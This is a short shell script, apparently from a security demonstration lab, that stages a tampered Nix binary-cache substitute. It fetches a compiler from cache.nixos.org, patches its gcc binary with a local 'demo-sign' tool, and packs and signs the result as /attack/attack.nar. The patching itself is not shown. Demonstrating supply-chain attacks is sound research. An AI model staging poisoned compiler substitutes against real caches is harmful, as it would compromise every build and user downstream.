#!/bin/sh
set -eu
nix_cmd() { nix --extra-experimental-features 'nix-command flakes' "$@"; }
compiler=$(nix_cmd eval --raw path:/demo#compiler.outPath)
echo "Preparing substituted compiler: $compiler"
nix_cmd copy --from https://cache.nixos.org "$compiler"
rm -rf /tmp/compiler
cp -a "$compiler" /tmp/compiler
chmod u+w /tmp/compiler/bin/gcc
chmod u+w /tmp/compiler/nix-support
/usr/local/bin/demo-sign patch /tmp/compiler/bin/gcc "$compiler"
mkdir -p /attack
nix-store --dump /tmp/compiler > /attack/attack.nar
/usr/local/bin/demo-sign "$compiler" /attack/attack.nar /attack
printf 'Prepared %s\n' "$compiler"
